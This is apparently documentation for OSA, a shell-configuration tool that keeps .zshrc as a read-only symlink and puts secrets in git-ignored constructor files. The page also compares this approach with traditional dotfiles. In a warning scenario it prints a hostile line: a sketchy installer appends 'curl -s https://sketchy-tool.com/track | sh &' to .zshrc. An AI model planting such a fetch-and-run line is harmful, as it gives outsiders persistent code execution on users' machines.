# Configuration and Settings

## Purpose

Open Source Automation (OSA) provides a unified development environment by:
- Maintaining **full control** over shell configuration through workspace management
- Preventing external tools from breaking your setup with unexpected modifications
- Enabling **version-controlled configuration** that travels with you across machines
- Keeping secrets and machine-specific settings **out of your repo** via constructors

## Security Model: OSA vs Traditional Dotfile Management

### OSA's Approach (Workspace-Based)

**Benefits:**
- ✅ **Protected Configuration**: Your `.zshrc` is a **read-only symlink** to the repo, preventing accidental or malicious modifications
- ✅ **Version Control**: All configuration changes are tracked in git with full history
- ✅ **Audit Trail**: Know exactly what changed, when, and why
- ✅ **Constructor Isolation**: Secrets live in `.gitignore`d files (`init.zsh`, `final.zsh`, `__local__*.zsh`) that never touch the repo
- ✅ **Tool Sandboxing**: External installers (mise, nvm, etc.) are **prevented from modifying** your shell files
- ✅ **Team Consistency**: Everyone gets the same base config, customized per-machine via constructors
- ✅ **Easy Rollback**: `git revert` to undo any config changes instantly
- ✅ **Cross-Machine Safety**: Bad changes on one machine won't propagate to others until you explicitly commit them

**How It Works:**
```bash
# Your actual .zshrc is protected
~/.zshrc -> ~/.osa/src/zsh/.zshrc (read-only symlink)

# Machine-specific secrets go here (never committed)
~/.osa/src/zsh/constructors/init.zsh    # API keys, tokens
~/.osa/src/zsh/constructors/final.zsh   # Custom aliases
~/.osa/src/zsh/constructors/__local__*  # Machine overrides
```

### Traditional Approach (Direct File Management)

**Risks:**
- ⚠️ **Unprotected Files**: `.zshrc` is a regular file that any tool can modify
- ⚠️ **Silent Corruption**: Installers append code you never reviewed
- ⚠️ **Merge Conflicts**: Multiple tools fight over the same file
- ⚠️ **No History**: Changes happen without git tracking
- ⚠️ **Credential Leaks**: Easy to accidentally commit secrets when everything is in `.zshrc`
- ⚠️ **Hard to Debug**: "What broke my shell?" requires manual file inspection
- ⚠️ **Tool Lock-In**: Removing a tool often leaves behind configuration debris

**Common Problems:**
```bash
# Scenario 1: Installer modifies your .zshrc
$ brew install some-tool
# Appends 20 lines to .zshrc without asking

# Scenario 2: Credential exposure
$ cat ~/.zshrc
export GITHUB_TOKEN="ghp_abc123..."  # Oops, about to commit this

# Scenario 3: Multiple version managers fighting
$ cat ~/.zshrc | grep "export PATH"
# 15 different PATH modifications, loading order unclear
```

## Security Tradeoffs

### What OSA Protects Against

1. **Malicious Installers**: Tools can't inject code into your shell startup
2. **Accidental Breakage**: Typos in `.zshrc` require explicit git commits
3. **Credential Leaks**: Secrets stay in constructors (`.gitignore`d by default)
4. **Configuration Drift**: Base config is identical across all your machines
5. **Audit Requirements**: Every change has a commit message and author

### What You Still Need To Protect

1. **Constructor Files**: `init.zsh` and `final.zsh` are **not** read-only—you're responsible for their security
2. **Repository Access**: Anyone with access to your OSA repo can see your (non-secret) configuration
3. **Symlink Attacks**: Ensure `~/.osa` points to your actual repo, not a malicious directory
4. **Machine Compromise**: If someone has shell access to your machine, they can modify constructors or replace the repo

### Recommended Security Practices

```bash
# 1. Keep constructors out of git
$ cat .gitignore
src/zsh/constructors/init.zsh
src/zsh/constructors/final.zsh
src/zsh/constructors/__local__*

# 2. Verify symlinks point to the right place
$ ls -la ~/.zshrc ~/.osa
~/.zshrc -> /Users/you/dev/osa/src/zsh/.zshrc
~/.osa -> /Users/you/dev/osa

# 3. Use environment variables for secrets
$ cat src/zsh/constructors/init.zsh
export GITHUB_TOKEN="${GITHUB_TOKEN:-}"  # Load from keychain/vault

# 4. Review changes before committing
$ git diff src/zsh/
$ git commit -m "Add new alias for deployment"

# 5. Use file permissions on constructors
$ chmod 600 src/zsh/constructors/init.zsh  # Only you can read/write
```

## Why This Matters: Real-World Scenarios

### Scenario 1: Rogue Installer
**Without OSA:**
```bash
$ curl -fsSL https://sketchy-tool.com/install.sh | sh
# Silently appends to ~/.zshrc:
# export PATH="/sketchy/bin:$PATH"
# curl -s https://sketchy-tool.com/track | sh &
```

**With OSA:**
```bash
$ curl -fsSL https://sketchy-tool.com/install.sh | sh
# Tries to modify ~/.zshrc but fails (read-only)
# You notice the error, investigate, and decline to install
```

### Scenario 2: Accidental Credential Commit
**Without OSA:**
```bash
$ echo "export AWS_SECRET=abc123" >> ~/.zshrc
$ git add ~/.zshrc  # Oops, wrong file
$ git push          # Secret now in git history forever
```

**With OSA:**
```bash
$ echo "export AWS_SECRET=abc123" >> ~/.osa/src/zsh/constructors/init.zsh
$ git status
# init.zsh is .gitignore'd, cannot be committed accidentally
```

### Scenario 3: Team Configuration Consistency
**Without OSA:**
- Dev A uses nvm, Dev B uses fnm, Dev C uses mise
- Everyone's shell startup is different
- "Works on my machine" becomes a daily problem

**With OSA:**
- All devs use the same base `.zshrc` from the repo
- Mise is activated consistently for everyone
- Machine-specific settings go in constructors
- Team debugging is easier because shells are identical

## Initial Setup

Use the interactive CLI for guided setup:

```bash
chmod +x ./osa-cli.zsh && ./osa-cli.zsh --interactive
```

Or for minimal setup (core + mise):

```bash
chmod +x ./osa-cli.zsh && ./osa-cli.zsh --minimal
```

See the main `README.md` and `SETUP-GUIDE.md` for detailed instructions.

## Core Developer Tools

### Package Managers

#### Homebrew (macOS/Linux)
- **Installed via**: OSA setup (required on macOS)
- **Purpose**: System-level package management
- **Security**: Official Homebrew installer, verified via checksums
- [Official docs](https://docs.brew.sh/Installation)

#### Mise (Recommended - Polyglot Runtime Manager)
- **Replaces**: nvm, rbenv, pyenv, jenv, etc.
- **Manages**: Node.js, Python, Ruby, Java, Go, Rust, and more
- **Installed via**: OSA setup (`--minimal` or `--interactive`)
- **Security**: Prevented from modifying `.zshrc` (we manage activation in `base.zsh`)
- [Official docs](https://mise.jdx.dev/)
- After setup, run `mise install` to install configured runtimes

**Why Mise is Safer with OSA:**
- Mise's installer tries to modify `.zshrc`—we block this by managing activation ourselves
- We activate mise in `src/zsh/constructors/base.zsh` under our control
- You can disable mise by commenting 3 lines instead of hunting through `.zshrc`

### Shell Framework

#### Oh My Zsh
- **Installed via**: OSA setup (required)
- **Includes**: Powerlevel10k theme, zsh-syntax-highlighting, evalcache
- **Security**: Cloned to `~/.osa/external-libs/oh-my-zsh` (not system-wide)
- [Official repo](https://github.com/ohmyzsh/ohmyzsh)

### Search & Navigation Tools

#### ripgrep
- Fast grep alternative for searching codebases
- Install: `brew install ripgrep`
- [GitHub repo](https://github.com/BurntSushi/ripgrep)

#### direnv
- Per-project environment variable management
- Integrates with mise for runtime switching
- Install: `brew install direnv`
- [Official site](https://direnv.net/)

### Recommended Optional CLI Tools

Install via Homebrew after OSA setup:

```bash
brew install \
  ripgrep \      # Fast grep alternative (rg)
  fzf \          # Fuzzy finder for files/history
  bat \          # Cat with syntax highlighting
  eza \          # Modern ls replacement
  tldr \         # Simplified man pages
  jq \           # JSON processor (required for OSA config files)
  httpie \       # User-friendly HTTP client
  gh \           # GitHub CLI
  lazygit        # Terminal UI for git
```

```

### Deprecated / No Longer Recommended

- **NVM** → Use `mise` instead for Node.js version management
- **rbenv** → Use `mise` instead for Ruby version management
- **pyenv** → Use `mise` instead for Python version management
- **jenv** → Use `mise` instead for Java version management

**Why?** These tools all try to modify your `.zshrc` during installation. With OSA + mise, you get:
- Single tool for all runtimes
- No `.zshrc` pollution
- Faster shell startup (one eval instead of 4+)
- Consistent behavior across languages

## IDE and Development Software

### Code Editors

#### Visual Studio Code
- **Configuration**: Included in `src/apps/vscode/settings.json`
- [Download](https://code.visualstudio.com/)

#### PhpStorm (JetBrains)
- **Configuration**: Included in `src/apps/phpstorm_exported_settings/`
- [Recommended plugins](./phpstorm-plugins.md)
- **Tip**: Use JetBrains Toolbox to create CLI shortcut
  - Find the generated script in Toolbox
  - Add alias in constructor: `alias phpstorm='/path/to/phpstorm'` (in `final.zsh`)

### Mobile Development

#### Xcode (macOS)
- Required for iOS/macOS development
- Install from Mac App Store
- Run setup permissions: See `src/setup/setup-xcode-node-file-permissions.zsh`

#### Android Studio
- **Configuration**: See `src/apps/android-studio/` for WSL setup
- Required for Android development
- Setup steps:
  1. Create an empty project to access SDK Manager
  2. Install Android SDK versions (API 16 → latest recommended)
  3. Install: Android Emulator, NDK, CMake, GPU Debugging Tools
  4. Create at least one AVD (Android Virtual Device) via AVD Manager
- [Download](https://developer.android.com/studio)

### Terminal

#### iTerm2 (macOS)
- **Configuration**: See `src/apps/iterm2/iterm-default-config.json`
- Enhanced terminal for macOS
- Set as default terminal after installation
- [Download](https://iterm2.com/)

## Networking & VPN Tools

### Charles Proxy
- **Configuration**: See `src/apps/charles/charles.sh`
- HTTP debugging proxy for API development
- [Download](https://www.charlesproxy.com/)

### Cisco AnyConnect VPN
- **Configuration**: See `src/apps/cisco/anyconnect-vpn.zsh`
- Enterprise VPN client
- Supports automated connection via CLI (requires setup of credentials in constructors)
- [Download from your organization]

## Configuration Management

### Constructors: Machine-Specific Config

OSA uses **constructors** to inject machine-specific or secret configuration without committing it to git. See [constructors.md](constructors.md) for full details.

**Files** (all `.gitignore`d by default):
- `src/zsh/constructors/init.zsh` - Loaded **before** main setup (secrets, env vars)
- `src/zsh/constructors/final.zsh` - Loaded **after** main setup (aliases, functions)
- `src/zsh/constructors/__local__*.zsh` - Pattern for local overrides

**Example** (`init.zsh`):
```bash
# Export secrets from keychain/vault
export GITHUB_TOKEN="$(security find-generic-password -s github-token -w)"
export AWS_ACCESS_KEY_ID="$(aws configure get aws_access_key_id)"

# Machine-specific paths
export WORK_DIR="$HOME/work/my-company"
```

**Example** (`final.zsh`):
```bash
# Custom aliases
alias deploy='cd $WORK_DIR && ./deploy.sh'
alias logs='kubectl logs -f'

# Override default behavior
alias ls='eza --icons'  # Use eza instead of ls
```

### JSON Config Files

For automated/team setups, use JSON configuration files:

```bash
# Use a preset
./osa-cli.zsh --config-file configs/frontend-dev.json

# Create your own
cp configs/example-config.json my-team.json
# Edit my-team.json with your team's standard tools
./osa-cli.zsh --config-file my-team.json
```

See [configs/README.md](../configs/README.md) for schema and examples.

## Utilities & Scripts

### Script Permissions

Scripts require execute permission:

```bash
chmod +x <script-path>
```

### Watchman (File Watching)
- **Configuration**: See `src/apps/watchman/`
- File watching service for React Native and other tools
- macOS file limit setup: `src/apps/watchman/set-max-file-limit.sh`
- Install: `brew install watchman`
- [GitHub repo](https://github.com/facebook/watchman)

## Quality of Life Software

### Productivity

- **Note Taking**: [Notion](https://www.notion.so/) - All-in-one workspace
- **Time Tracking**: [Toggl](https://toggl.com/) - Simple time tracking
- **Window Management**: [Rectangle](https://rectangleapp.com/) - Free window manager (replaces Spectacle)
  - Alternative: [Spectacle](https://www.spectacleapp.com/) (discontinued but still works)

### Privacy & Security

- **Network Monitoring**: [Little Snitch](https://www.obdev.at/products/littlesnitch/) - Firewall and network monitor (macOS)
- **Notification Management**: [Muzzle](https://muzzleapp.com/) - Auto-silence notifications during screen sharing

### Media & Design

- **Screenshots & Annotation**: [Skitch](https://evernote.com/products/skitch) - Quick annotations and markup
- **Wireframing**: [Sketch](https://www.sketch.com/) - macOS design tool
- **Clipboard History**: [CopyClip](https://apps.apple.com/us/app/copyclip-clipboard-history/id595191960?mt=12) - Clipboard manager (macOS)

### Automation (macOS)

- **Automator Scripts**: See `src/apps/automator/` for example workflows
  - Example: Toggle Microphone Mute workflow
  - AppleScripts for common tasks

### Windows & WSL Tools

- **Windows Terminal**: Configuration in `src/apps/windows-terminal/settings.json`
- **AutoHotkey Scripts**: See `src/apps/autohotkey/` for keyboard shortcuts and automation
- **WSL Port Forwarding**: See `src/apps/wsl/` for Windows-WSL integration
- **Docksal on WSL**: See [WSL-Docksal setup guide](./wsl-docksal.md)

## Using Configurations from This Repository

### Application Settings

This repository includes configuration files for various applications:

- **VS Code**: `src/apps/vscode/settings.json`
- **iTerm2**: `src/apps/iterm2/iterm-default-config.json`
- **Windows Terminal**: `src/apps/windows-terminal/settings.json`
- **PhpStorm**: `src/apps/phpstorm_exported_settings/`

**To use these configurations:**

1. **Option A - Copy**: Copy the relevant config file to your application's settings location
2. **Option B - Symlink**: Create symlinks (see `src/setup/initialize-repo-symlinks.zsh` for examples)
3. **Option C - Import**: Use the app's import/settings sync feature

**Security Note**: Application configs in this repo are **public and safe to commit**. Never put API keys or tokens here—use constructors instead.

### Custom Aliases and Functions

Add project-specific shortcuts via constructors (never modify `.zshrc` directly):

```bash
# Example: Add to src/zsh/constructors/final.zsh
alias myproject='cd ~/dev/myproject'
alias serve='python -m http.server 8000'

# Custom function
dev() {
  cd ~/dev/$1
  code .
}
```

**Why constructors?**
- `.gitignore`d by default (safe for secrets)
- Loaded after all base configuration
- Won't conflict with OSA updates
- Easy to disable (just rename the file)

### Per-Project Configuration

Use `.mise.toml` files in project directories for project-specific runtime versions:

```toml
# .mise.toml example
[tools]
node = "20.11.0"
python = "3.12"
ruby = "3.3.0"
```

When you `cd` into the directory, mise automatically switches to those versions.

## Recommended Workflow

1. **Base Setup**: Run `./osa-cli.zsh --interactive` on a new machine
2. **Team Config**: Share a JSON config via git/gist for team consistency  
3. **Secrets**: Add machine-specific secrets to `init.zsh` (never commit)
4. **Aliases**: Add personal/team aliases to `final.zsh`
5. **Updates**: Run `mpc update` or `git pull` to get repo changes, review with `git diff`
6. **Audit**: Use `git log src/zsh/` to see who changed what and when

## Platform-Specific Notes

### macOS

- **Spotlight Fix**: See `src/apps/mac/spotlight-fix.sh` if Spotlight indexing is slow
- **File Limits**: Run `src/apps/watchman/set-max-file-limit.sh` for React Native development
- **File Associations**: See `src/setup/macos-defaults/set-all-files-to-vscode.zsh` to set VS Code as default

### Windows & WSL

- **Port Forwarding**: Use `src/apps/wsl/WSL-remap-ports-task-schedule.xml` for Windows-WSL networking
- **Snap Fix**: Run `npm run fix:snap` if snap is broken in WSL
- **WSL Bridge**: See `src/apps/wsl/wslbridge.ps1` for PowerShell integration

## Summary: Why OSA's Model is More Secure

| Aspect | Traditional Dotfiles | OSA Workspace Model |
|--------|---------------------|---------------------|
| **Config Protection** | ❌ Any tool can modify `.zshrc` | ✅ Read-only symlink, changes require git commit |
| **Audit Trail** | ❌ No history of changes | ✅ Full git history |
| **Credential Safety** | ⚠️ Easy to commit secrets | ✅ Secrets isolated in constructors (.gitignore) |
| **Tool Sandboxing** | ❌ Installers can inject code | ✅ Installers blocked from modifying config |
| **Team Consistency** | ❌ Everyone's setup diverges | ✅ Base config identical, local overrides separate |
| **Rollback** | ⚠️ Manual file restoration | ✅ `git revert` or `git checkout` |
| **Cross-Machine Sync** | ⚠️ Copy/paste or symlink farm | ✅ Clone repo, run setup, done |

**The tradeoff:** Slightly more complexity (symlinks, constructors) in exchange for significantly better security and maintainability. For teams and security-conscious developers, this is a net win.

## Additional Documentation

- **Setup Guide**: `SETUP-GUIDE.md` - Complete setup instructions
- **Constructors**: `docs/constructors.md` - Extend setup with machine-specific config
- **CLI Commands**: `docs/mpc-cli.md` - Built-in helper commands
- **Community Scripts**: [osa-scripts](https://github.com/VirtualizeLLC/osa-scripts) - Productivity helpers and shell functions
- **WSL & Docksal**: `docs/wsl-docksal.md` - Docker development on Windows
- **Quick Reference**: `QUICK-REFERENCE.md` - Common commands and workflows
- **Main README**: `README.md` - Project overview and quick start

---

**Related:**
- [constructors.md](constructors.md) - How to use constructors for secrets/overrides
- [mpc-cli.md](mpc-cli.md) - Built-in `mpc` helper commands
- [../README.md](../README.md) - Project overview
- [osa-scripts](https://github.com/VirtualizeLLC/osa-scripts) - Community helpers and utilities

````
